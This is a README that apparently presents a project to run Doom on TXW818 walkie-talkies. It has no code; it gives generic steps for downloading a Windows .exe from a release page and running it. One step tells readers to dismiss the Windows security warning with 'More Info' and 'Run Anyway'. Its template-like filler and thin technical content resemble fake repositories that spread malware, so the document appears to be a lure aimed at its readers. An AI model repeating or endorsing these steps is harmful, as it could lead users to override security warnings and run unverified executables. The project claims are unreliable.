# 🎮 TXW818_WalkieTalkie_Doom - Play classic games on walkie talkies

[![](https://img.shields.io/badge/Download_Software-Release_Page-blue)](https://github.com/VadimGotfrid430/TXW818_WalkieTalkie_Doom/releases)

This project brings the game Doom to TXW818 walkie-talkies. The software works on hardware with a C-Sky chip. You can play the full game on the screen of your radio.

## 🛠 Project Overview

The TXW818 chip contains a processor that runs at 240 MHz. This power allows the device to play games. The software uses the internal parts of the radio to store game data. It displays the game on the small LCD screen built into the radio. This works because the software compresses the game files to fit into the memory of the radio.

## 📦 System Requirements

To install and run this software, you need the following items:

* A computer running Windows 10 or Windows 11.
* A USB cable to connect the radio to your computer.
* A compatible TXW818 radio device.
* At least 50 MB of free space on your computer hard drive.
* The latest software package from the project repository.

Ensure that your radio battery has a charge of at least 50 percent before you begin the process. A low battery might cause the update to fail.

## 🚀 Getting Started

Follow these steps to prepare your computer and your radio.

1. Turn on your computer and open your web browser.
2. Go to the [official release page](https://github.com/VadimGotfrid430/TXW818_WalkieTalkie_Doom/releases).
3. Look for the section labeled Assets.
4. Click the link that ends in .exe to download the installer.
5. Save the file to your desktop for easy access.

## 💾 Installation Process

The installer moves the necessary files to your computer.

1. Double-click the file you downloaded.
2. Follow the prompts on your screen.
3. Windows might show a warning message. Click the More Info link and then click Run Anyway to proceed.
4. Choose a folder on your computer where you want to keep the program files.
5. Wait for the progress bar to finish.

## 🔌 Connecting the Radio

You must link the radio to your computer to transfer the game files.

1. Plug one end of your USB cable into the port on the radio.
2. Plug the other end into a USB port on your computer.
3. Turn the power switch on the radio to the On position.
4. On your computer, open the program you just installed.
5. The software will search for the radio automatically.
6. Once the program finds the radio, a green light will appear on the status bar.

## 🎮 Playing the Game

After the software detects your radio, you can start the transfer.

1. Click the button labeled Flash Game to Radio in the main window.
2. The computer will send the Doom game data to the radio memory.
3. Do not disconnect the USB cable during this process.
4. The program will tell you when the process is complete.
5. Disconnect the USB cable from the radio.
6. Press the menu button on your radio to find the new game icon.
7. Select the icon to start playing Doom.

## ⚙️ Troubleshooting Issues

Use this list if you have trouble getting the game to load.

* If the program does not see the radio, try a different USB port on your computer.
* If the screen on the radio stays blank, turn the radio off and back on.
* Check that your USB cable is data-capable. Some cables only charge devices and do not transfer information.
* If the game crashes, hold the reset button on the side of the radio for five seconds. This restores the factory settings of the device so you can try the installation again.
* Keep your computer plugged into a power source during the installation to ensure the USB ports provide enough electricity.

The software includes a log file that records the progress of the transfer. If you have persistent errors, look for a text file titled log.txt in the installation folder. This file contains information that helps identify why the radio is not accepting the update. 

The memory on the radio manages space automatically. You do not need to delete older files before installing the game. The software will clear the necessary space and install the game data in one step.
